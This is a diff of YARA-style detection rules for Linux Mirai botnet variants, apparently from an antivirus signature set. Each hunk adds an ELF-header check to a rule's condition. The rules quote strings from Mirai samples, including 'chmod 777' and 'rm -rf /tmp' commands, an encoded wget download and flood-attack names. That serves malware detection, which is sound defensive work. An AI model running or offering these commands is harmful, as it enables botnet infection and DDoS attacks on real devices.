         $x_1_2 = {8d 9d 60 ff ff ff 51 68 80 00 00 00 53 56 e8 [0-5] ff 83 c4 10 85 c0 [0-5] 52 50 53 57 e8 [0-5] 83 c4 10}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2359,6 +2451,7 @@ rule Backdoor_Linux_Mirai_R_2147818248_0
         $x_1_4 = "chmod 777 nig" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2384,6 +2477,7 @@ rule Backdoor_Linux_Mirai_U_2147818249_0
         $x_1_5 = "TELECOMADMIN" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2408,6 +2502,7 @@ rule Backdoor_Linux_Mirai_BH_2147818335_0
         $x_1_4 = {c7 43 34 00 00 00 00 89 43 30 c6 43 38 01 c6 43 39 03 c6 43 3a 03}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2433,6 +2528,7 @@ rule Backdoor_Linux_Mirai_BJ_2147818336_0
         $x_1_5 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2458,6 +2554,7 @@ rule Backdoor_Linux_Mirai_BG_2147818337_0
         $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2482,6 +2579,7 @@ rule Backdoor_Linux_Mirai_V_2147818376_0
         $x_1_4 = "/proc/cpuinfo" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2507,6 +2605,7 @@ rule Backdoor_Linux_Mirai_AQ_2147818396_0
         $x_1_5 = "DEBUG MODE YO" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2531,6 +2630,7 @@ rule Backdoor_Linux_Mirai_AS_2147818397_0
         $x_1_4 = "POST /cdn-cgi/" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2555,6 +2655,7 @@ rule Backdoor_Linux_Mirai_AU_2147818398_0
         $x_1_4 = "/dev/null" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -2579,6 +2680,7 @@ rule Backdoor_Linux_Mirai_AW_2147818542_0
         $x_2_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2606,6 +2708,7 @@ rule Backdoor_Linux_Mirai_BA_2147818623_0
         $x_1_7 = "ddos_flood_std" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((5 of ($x_1_*))) or
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
@@ -2633,6 +2736,7 @@ rule Backdoor_Linux_Mirai_BB_2147818625_0
         $x_2_3 = {77 67 65 74 2b 68 74 74 70 3a 2f 2f [0-40] 74 6d 70 2f 67 61 66}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2658,6 +2762,7 @@ rule Backdoor_Linux_Mirai_AV_2147818680_0
         $x_1_5 = "tcprand" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2683,6 +2788,7 @@ rule Backdoor_Linux_Mirai_BI_2147818744_0
         $x_1_5 = "ajwligf" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2706,6 +2812,7 @@ rule Backdoor_Linux_Mirai_P_2147818852_0
         $x_1_3 = {47 45 54 20 2f 61 72 6d ?? 2e 62 6f 74 2e 6c 65 20 48 54 54}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -2730,6 +2837,7 @@ rule Backdoor_Linux_Mirai_AT_2147819147_0
         $x_1_4 = "GET /ftptest.cgi" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2752,6 +2860,7 @@ rule Backdoor_Linux_Mirai_AW_2147819152_0
         $x_1_2 = {00 ea 00 c1 92 e7 04 30 dc e5 07 00 53 e1 04 00 00 0a 01 00 80 e2 01 00 50 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2775,6 +2884,7 @@ rule Backdoor_Linux_Mirai_AW_2147819152_1
         $x_1_3 = {a8 9d e8 0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 24 d0 4d e2 24 00 0b e5 28 10 0b e5 30 30 0b e5 2c 20 4b e5 42}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2799,6 +2909,7 @@ rule Backdoor_Linux_Mirai_BL_2147819180_0
         $x_2_4 = {89 e8 8b 7c 24 50 89 f2 25 ff f7 f7 ff 89 44 24 10 8b 44 24 58 8d 4c 24 0c c7 44 24 18 00 00 00 00 89 7c 24 0c c7 44 24 1c 00 00 00 00 89 44 24 14 89 d8 c7 44 24 20 00 00 00 00}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -2827,6 +2938,7 @@ rule Backdoor_Linux_Mirai_BN_2147819181_0
         $x_1_5 = "nkqvglkle" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2849,6 +2961,7 @@ rule Backdoor_Linux_Mirai_AZ_2147819250_0
         $x_1_2 = {00 24 8f 99 80 cc 8f bf 00 54 8f be 00 50 8f b7 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2870,6 +2983,7 @@ rule Backdoor_Linux_Mirai_AY_2147819252_0
         $x_1_1 = {89 f1 29 d9 0f 84 0a ff ff ff 31 c0 8b 5c 24 1c 8a 44 24 2b 8b 74 24 24 83 f9 01 8d 1c de 8d 14 38 89 5c 24 34 8b 5c 24 1c 8a 02 88 44 de 04 0f 84 df fe ff ff 8a 42 01 31 db 8d 71 fe 88 c3 88 44 24 2b 39 de 0f 8c c9 fe ff ff 8d 7a 02}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2894,6 +3008,7 @@ rule Backdoor_Linux_Mirai_BD_2147819262_0
         $x_1_4 = "meinsm" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2918,6 +3033,7 @@ rule Backdoor_Linux_Mirai_BF_2147819264_0
         $x_1_4 = "6SRS>B" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2943,6 +3059,7 @@ rule Backdoor_Linux_Mirai_BE_2147819265_0
         $x_1_5 = "Self Rep Fucking NeTiS" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2968,6 +3085,7 @@ rule Backdoor_Linux_Mirai_BH_2147819266_0
         $x_1_5 = "chmod 777 * /tmp/skere" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2993,6 +3111,7 @@ rule Backdoor_Linux_Mirai_BG_2147819267_0
         $x_1_5 = "tsgoingon" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3016,6 +3135,7 @@ rule Backdoor_Linux_Mirai_Y_2147819334_0
         $x_1_3 = {03 10 a0 e1 c8 30 9f e5 91 23 83 e0 23 33 a0 e1 b4 30 0b e5 b4 30 1b e5 03 21 a0 e1 82 31 a0 e1 03 30 62 e0 b4 20 1b e5 02 30 83 e0 03 31 a0 e1 01 10 63 e0 b4 10 0b e5 b4 30 1b e5 23 21 a0 e1 ?? ?? 9f e5 02 c1 93 e7 94 30 4b e2 03 00 a0 e1}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3038,6 +3158,7 @@ rule Backdoor_Linux_Mirai_Z_2147819335_0
         $x_1_2 = {e5 1c 30 1b e5 03 00 a0 e1 fc 10 9f e5 51 0b 00 eb 00 30 a0 e1 18 30 0b e5 18 30 1b e5 00 00 53 e3}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3060,6 +3181,7 @@ rule Backdoor_Linux_Mirai_BQ_2147819341_0
         $x_1_2 = {06 30 d2 e7 22 30 23 e2 06 30 c2 e7 01 20 82 e2 07 00 52 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3084,6 +3206,7 @@ rule Backdoor_Linux_Mirai_AF_2147819487_0
         $x_1_4 = "well-knownLore" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3110,6 +3233,7 @@ rule Backdoor_Linux_Mirai_BI_2147819489_0
         $x_1_6 = "killed malicious" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3135,6 +3259,7 @@ rule Backdoor_Linux_Mirai_BN_2147819490_0
         $x_1_5 = "chmod 777 * /tmp/skere" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -3160,6 +3285,7 @@ rule Backdoor_Linux_Mirai_S_2147819493_0
         $x_1_5 = "tcpplain" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -3183,6 +3309,7 @@ rule Backdoor_Linux_Mirai_BK_2147819509_0
         $x_1_3 = {3c 8d e2 70 30 83 e2 03 20 8c e0 a4 30 12 e5 33 31 a0 e1 01 00 13}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3205,6 +3332,7 @@ rule Backdoor_Linux_Mirai_BL_2147819510_0
         $x_1_2 = {2f 84 00 03 55 00 58 28 54 eb 6c fe 7d 00 02 78 7c eb 5a 78 2f 04 00 01 7c 0b 5a 78 54 00 c2 3e 7c 0a 03 78 7c 00 5a 78 41 bd ff b4 7d 40 5a 78 38 84 ff fe 41 9a 00 34 b0 03 00 00 38 63 00 02}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3227,6 +3355,7 @@ rule Backdoor_Linux_Mirai_BM_2147819511_0
         $x_1_2 = {0f b6 85 a7 f7 ff ff 85 c0 89 85 ac f7 ff ff 0f 8e fd 00 00 00 44 89 f8 4c 8b ad 98 f7 ff ff 4c 8b a5 98 f7 ff ff 66 c1 c8 08 66 89 85 be f7 ff ff 8b 85 ac f7 ff ff 45 31 f6 49 83 c5 02 ff c8 48 ff c0 48 89 85 88 f7 ff ff}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3252,6 +3381,7 @@ rule Backdoor_Linux_Mirai_AV_2147819518_0
         $x_1_5 = {06 30 d2 e7 37 30 23 e2 06 30 c2 e7 01 20 82 e2 07 00 52 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3279,6 +3409,7 @@ rule Backdoor_Linux_Mirai_AX_2147819540_0
         $x_1_7 = {42 24 08 00 43 ac 03 00 02 24 08 00 c2 af 23 00 00 10}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -3302,6 +3433,7 @@ rule Backdoor_Linux_Mirai_BP_2147819587_0
         $x_1_3 = {7e 20 3a 43 04 74 23 8d 53 08 31 c9 eb ?? 0f b6 42 04 89 d3 83 c2 08 3a 44 24 03 74 0d 41 39 f1 75 ec 8b 44 24 1c}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3323,6 +3455,7 @@ rule Backdoor_Linux_Mirai_BO_2147819635_0
         $x_2_1 = {89 e5 0f b6 55 08 0f b6 45 0c 0f b6 4d 10 c1 e2 18 c1 e0 10 09 c2 0f b6 45 14 c1 e1 08 5d 09 c2 09 d1 89 ca 89 c8 81 e2 00 ff 00 00 c1 e2 08 c1 e0 18 09 d0 89 ca 81 e1 00 00 ff 00 c1 ea 18 c1 e9 08 09 ca 09 d0}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3345,6 +3478,7 @@ rule Backdoor_Linux_Mirai_BJ_2147819867_0
         $x_1_2 = {8b 0d 39 d9 10 00 8b 55 f0 8b 45 f4 89 c3 29 d3 89 da 89 c8 89 14 85 20 e1 50 00 89 c8 8b 04 85 20 e1 50 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3369,6 +3503,7 @@ rule Backdoor_Linux_Mirai_BJ_2147819867_1
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3392,6 +3527,7 @@ rule Backdoor_Linux_Mirai_BO_2147819870_0
         $x_1_3 = {10 19 14 00 49 c2 16 02 49 c3 0c 03 00 20 67 f0 0c 03 00 09 67 ea 0c 03 00 0a 67 e4 0c 00 00 2d 67 00 00 bc 0c 00 00 2b 67 00 00 a0 20 3c 7f ff ff ff}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3414,6 +3550,7 @@ rule Backdoor_Linux_Mirai_BP_2147819871_0
         $x_1_2 = {5e 2e 8d e2 17 1d 8d e2 10 30 a0 e3 04 20 82 e2 08 10 81 e2 e4 35 8d e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3436,6 +3573,7 @@ rule Backdoor_Linux_Mirai_BR_2147819872_0
         $x_1_2 = {04 80 00 2a b0 10 00 08 80 a4 a0 01 02 80 00 31 80 a4 a0 02 c2 0c 20 01 02 80 00 2e c2 2a 20 04 b2 04 bf}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3457,6 +3595,7 @@ rule Backdoor_Linux_Mirai_BW_2147820138_0
         $x_2_1 = {48 8b 34 24 48 98 66 83 7c 24 14 ff 48 8b 1c c6 4c 8d 63 14 75 09 e8 [0-5] 66 89 43 04 be 14 00 00 00 48 89 df 66 c7 43 0a 00 00 e8 [0-5] 48 63 8c 24 4c 01 00 00 66 89 43 0a 48 89 df 66 41 c7 44 24 10 00 00 48 c1 e1 04 49 8d 74 0d 00 8b 46 04 8d 50 01 66 c1 c8 08 0f b7 c0 89 56 04}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3480,6 +3619,7 @@ rule Backdoor_Linux_Mirai_BS_2147820176_0
         $x_1_3 = {c0 d0 1c 48 b3 41 c6 42 c7 0c 1c 00 34 10 1c 40 34 14 1c 80 34 18 1c c0 34 2c 1c 00 36 1c 1c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3502,6 +3642,7 @@ rule Backdoor_Linux_Mirai_BT_2147820178_0
         $x_1_2 = {00 c0 96 e5 51 3c 8d e2 ac 22 a0 e1 68 30 83}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3524,6 +3665,7 @@ rule Backdoor_Linux_Mirai_BV_2147820179_0
         $x_1_2 = {31 c0 89 44 24 34 8b 44 24 40 85 c0 74 51 0f b6 1f 84 db 88 5c 24 33 0f 85 ae 00 00 00 31 c0 89 44 24 3c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3547,6 +3689,7 @@ rule Backdoor_Linux_Mirai_W_2147820251_0
         $x_1_3 = {85 c0 75 e9 bf ?? ?? 40 00 e8 ?? ?? 00 00 8b 05 ?? ?? 10 00 3d 67 01 00 00 0f 9f c2 ff c0 89 05 ?? ?? 10 00 84 d2 74 ?? b8 00 00 00 00 e8 12 02 00 00 8b 05 ?? ?? 10 00 8d 14 00 8d 04 95 00 00 00 00 8d 04 02}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3569,6 +3712,7 @@ rule Backdoor_Linux_Mirai_BW_2147820431_0
         $x_1_2 = {19 30 96 e5 00 00 53 e3 04 30 a0 13 93 35 46 15 93 35 46 05 55 ff ff 0a 00 30 e0 e3 00 50 a0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3591,6 +3735,7 @@ rule Backdoor_Linux_Mirai_BX_2147820432_0
         $x_1_2 = {81 72 04 b2 80 65 42 30 3b 0a 06 4e fb 00 02 00 0a 19 72 19 ae 1a 16 19 e2}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3612,6 +3757,7 @@ rule Backdoor_Linux_Mirai_AK_2147821105_0
         $x_1_1 = {13 dd 4d e2 0c d0 4d e2 a0 01 9f e5 01 40 a0 e1 ?? ff ff eb 12 bd 8d e2 0f b0 8b e2 00 10 a0 e1 0b 00 a0 e1 ?? 0b 00 eb 04 30 94 e5 00 00 53 e3 7c 11 9f e5 0b 00 a0 e1 03 10 a0 11 ?? 0b 00 eb ?? 16 00 eb 00 00 50 e3 04 00 00 da 00 00 a0 e3 cc d0 8d e2}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3633,6 +3779,7 @@ rule Backdoor_Linux_Mirai_AL_2147822180_0
         $x_1_1 = {89 d0 03 01 89 eb 30 18 89 d0 03 01 89 fb 30 18 89 d0 03 01 89 f3 30 18 89 d0 03 01 8a 1c 24 30 18 42 8b 41 04 25 ff ff 00 00 39 d0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3656,6 +3803,7 @@ rule Backdoor_Linux_Mirai_AQ_2147822182_0
         $x_1_3 = {03 00 95 e8 03 00 84 e8 ?? ?? 00 eb b6 20 d7 e1 01 00 00 e2 18 30 8d e2 00 01 a0 e1 03 00 80 e0 22 34 a0 e1 ff 20 02 e2 02 24 83 e1 08 10 10 e5 01 39 a0 e3 08 00 a0 e1 ?? 0d 00 eb 00 00 a0 e3 ?? 01 00 eb 09 30 d7 e5 03 30 8a e0 03 00 50 e1 ea ff ff ba}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3679,6 +3827,7 @@ rule Backdoor_Linux_Mirai_BU_2147822218_0
         $x_1_3 = {83 81 00 30 83 a1 00 34 83 c1 00 38 83 e1 00 3c 38 21 00 40 4e 80 00 20 88 1d 00 00 3b c0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3701,6 +3850,7 @@ rule Backdoor_Linux_Mirai_BZ_2147822220_0
         $x_1_2 = {30 c0 e5 26 30 d4 e5 b0 30 c3 e3 40 30 83 e3 26 30 c4 e5 14 30 9d e5 1c 10 87}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3723,6 +3873,7 @@ rule Backdoor_Linux_Mirai_CA_2147822221_0
         $x_1_2 = {31 a0 e1 02 30 83 e0 24 21 13 e5 1f 10 00 e2 32 21 a0 e1 01 00 12}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3745,6 +3896,7 @@ rule Backdoor_Linux_Mirai_CB_2147822222_0
         $x_1_2 = {19 30 96 e5 00 00 53 e3 04 30 a0 13 93 35 46 15 93 35 46 05 55 ff ff 0a 00 30 e0 e3 00 50 a0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3767,6 +3919,7 @@ rule Backdoor_Linux_Mirai_CC_2147822224_0
         $x_1_2 = {e5 00 00 52 e3 3a 00 52 13 00 30 a0 03 01 30 a0 13 03 10 a0 01 05 00 00 0a 00 10 a0 e3 01 10 81}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3789,6 +3942,7 @@ rule Backdoor_Linux_Mirai_CD_2147822225_0
         $x_1_2 = {00 52 e1 0c 00 00 0a 02 c1 91 e7 10 e0 9d e5 04 30 dc e5 0e 00 53 e1 f7 ff ff 1a 00 60 8d e5 14 00 9d e5 09 10 a0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3812,6 +3966,7 @@ rule Backdoor_Linux_Mirai_BY_2147822251_0
         $x_1_3 = "rm -rf /tmp/bigH" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3834,6 +3989,7 @@ rule Backdoor_Linux_Mirai_CE_2147822367_0
         $x_1_2 = {30 4b e5 14 30 1b e5 23 34 a0 e1 14 30 0b e5 0d 30 5b e5 a3 31 a0 e1 0d 30 4b e5 0d 30 5b e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3856,6 +4012,7 @@ rule Backdoor_Linux_Mirai_CF_2147822368_0
         $x_1_2 = {c0 d2 e5 02 00 81 e2 01 e0 d7 e5 00 a0 d7 e5 0c 54 8b e1 02 b0 d1 e5 01 c0 d0 e5 02 80 d2 e5 02 20 80 e2 02}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3878,6 +4035,7 @@ rule Backdoor_Linux_Mirai_CG_2147822369_0
         $x_1_2 = {3c e0 10 01 38 e7 d3 7c 3c 60 10 00 38 63 68 28 48 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3900,6 +4058,7 @@ rule Backdoor_Linux_Mirai_CH_2147822371_0
         $x_1_2 = {4a 14 7c 09 03 a6 4e 80 04 20 81 21 51 44 3a 41 00 08 3a c1 01 2c 2e 09 00 00 38}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3922,6 +4081,7 @@ rule Backdoor_Linux_Mirai_BY_2147822460_0
         $x_1_2 = {b9 cd cc cc cc 89 c3 f7 e1 89 54 24 0c 89 44 24 08 8b 54 24 0c 89 d8 c1 ea 02 8d 14 92 29 d0 83 f8 04}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3945,6 +4105,7 @@ rule Backdoor_Linux_Mirai_BU_2147822821_0
         $x_1_3 = "/dev/misc/watchdog" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -3969,6 +4130,7 @@ rule Backdoor_Linux_Mirai_CJ_2147822822_0
         $x_1_1 = {83 25 23 e0 ae 39 2e e0 02 30 23 e0 22 c4 23 e0 ff 10 0c e2 2c 28 a0 e1 2c 34 a0 e1 00 00 51 e3 7f 00 51 13 ff 60 02 e2 ff 00 03 e2 2c 2c a0 e1 ee ff ff 0a 03 00 51 e3 ec ff ff 0a 0f 30 41 e2 38 00 51 e3 01 00 53 13}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3992,6 +4154,7 @@ rule Backdoor_Linux_Mirai_Ch_2147822840_0
         $x_1_3 = "killallbots" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -4015,6 +4178,7 @@ rule Backdoor_Linux_Mirai_Ch_2147822840_1
         $x_1_3 = {eb ff 10 00 e2 20 34 a0 e1 20 28 a0 e1 00 00 51 e3 ?? 00 51 13 ff c0 03 e2 ff 20 02 e2 20 ec a0 e1 f5 ff ff 0a 03}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -4038,6 +4202,7 @@ rule Backdoor_Linux_Mirai_Ch_2147822840_2
         $x_1_3 = {ec 57 9f e5 40 10 96 e5 05 00 a0 e1 ?? ?? 00 eb 00 00 50 e3 02 00 00 1a 00 34 95 e5 04 00 53 e3 fc 00 00 0a}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4062,6 +4227,7 @@ rule Backdoor_Linux_Mirai_CM_2147823187_0
         $x_1_4 = "hnopqb" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_3_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -4087,6 +4253,7 @@ rule Backdoor_Linux_Mirai_CN_2147823188_0
         $x_1_2 = {f7 03 00 2a a0 02 40 f9 96 02 80 52 f3 c3 02 91 78 19 00 94 c1 02 00 4b a0 02 40 f9 f4 0a c1 1a 94 de 01 1b 73 19 00 94 14 00 14 0b e0 03 13 aa e1 03 14 2a a3 0e 00 94 a0 02 40 f9 e1 03 13 aa 7f ca 34 38}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4109,6 +4276,7 @@ rule Backdoor_Linux_Mirai_CO_2147823189_0
         $x_1_2 = {a0 e1 2c 00 8d e5 28 10 8d e5 16 20 a0 e3 00 30 a0 e3 04 00 a0 e1 05 10 a0 e1 57 07 00 eb 05 10 a0 e1 3c 00 8d e5 15 20 a0 e3 04}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4131,6 +4299,7 @@ rule Backdoor_Linux_Mirai_CP_2147823191_0
         $x_1_2 = {c2 09 00 02 82 18 40 0b c2 29 00 02 c6 02 00 00 c2 09 00 03 82 18 40 0c c2 29 00 03 c4 02 00 00 c2 09 00 02 82 18 40 0d c2 29 00 02 c6 02 00 00 c2 09 00 03 82 18 40 0a c2 29 00 03 88 01 20 01 c2 12 20 04 80 a0 40 04 34 bf ff ee}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4152,6 +4321,7 @@ rule Backdoor_Linux_Mirai_CD_2147823561_0
